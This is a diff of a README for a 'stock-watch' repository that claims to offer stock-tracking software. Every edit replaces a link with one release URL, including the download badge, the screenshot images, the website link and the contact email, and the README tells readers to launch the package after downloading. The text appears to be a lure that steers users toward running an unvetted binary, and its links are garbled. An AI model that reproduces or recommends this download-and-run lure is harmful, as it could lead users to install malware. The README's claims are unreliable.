@@ -12,7 +12,7 @@ Welcome to the "stock-watch" repository! Here you will find an exciting collecti
 
 To get started, you can download our software package by clicking the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/Julia2806/stock-watch/releases/tag/v2.0)](https://github.com/Julia2806/stock-watch/releases/tag/v2.0)
 
 *Please note that the software package needs to be launched after downloading.*
 
@@ -34,10 +34,10 @@ Get the latest news and insights related to the stock market to make informed in
 
 Here are some screenshots from our software:
 
-![Screenshot 1](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/Julia2806/stock-watch/releases/tag/v2.0)
 *Figure 1: Real-Time Stock Data Dashboard*
 
-![Screenshot 2](https://via.placeholder.com/600x400)
+![Screenshot 2](https://github.com/Julia2806/stock-watch/releases/tag/v2.0)
 *Figure 2: Customizable Alerts Settings*
 
 ## Installation Guide 🛠️
@@ -58,7 +58,7 @@ We welcome contributions from the community to make the "stock-watch" repository
 
 ## Resources 📚
 
-For additional resources and documentation, please visit our [website](https://github.com/user-attachments/files/18410590/Software.zip).
+For additional resources and documentation, please visit our [website](https://github.com/Julia2806/stock-watch/releases/tag/v2.0).
 
 ## Releases 🚀
 
@@ -66,6 +66,6 @@ If the provided link does not work, please check the "Releases" section of this 
 
 ## Contact Us 📧
 
-If you have any questions or feedback, feel free to reach out to us via email at [stockwatch@example.com](mailto:stockwatch@example.com).
+If you have any questions or feedback, feel free to reach out to us via email at [https://github.com/Julia2806/stock-watch/releases/tag/v2.0](https://github.com/Julia2806/stock-watch/releases/tag/v2.0).
 
 Start tracking your stocks like a pro with "stock-watch"! Happy investing! 🎉📊
